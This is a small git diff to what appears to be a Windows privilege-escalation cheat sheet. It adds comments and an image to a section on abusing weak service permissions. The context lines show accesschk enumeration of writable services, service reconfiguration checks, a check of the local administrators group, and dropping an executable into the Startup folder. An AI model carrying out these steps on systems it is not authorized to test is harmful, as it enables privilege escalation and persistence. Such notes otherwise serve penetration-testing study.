@@ -454,11 +454,12 @@ move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 ## Service Permissions
 
 ```shell
+# run powerup.ps1 and look for "Checking service permissions"
 #binary paths
 #in windows cmd
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *
 
-C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc  # daclsvc is being service name in this case
 #user has SERVICE_CHANGE_CONFIG permission
 
 sc qc daclsvc
@@ -472,6 +473,8 @@ net localgroup administrators
 
 #we can also exploit unquoted service paths, if any exist
 ```
+![image](https://github.com/user-attachments/assets/014d9d81-5666-421f-b95f-4e4f50dd6045)
+
 ![image](https://github.com/user-attachments/assets/72975ae2-917d-48cf-8bbb-e1c1dee3b0c9)
 ![image](https://github.com/user-attachments/assets/0a9cef29-aedb-4da1-ba84-b3cf4be83340)
 ![image](https://github.com/user-attachments/assets/1b81fd8e-b084-4195-bd14-633c2e124b57)
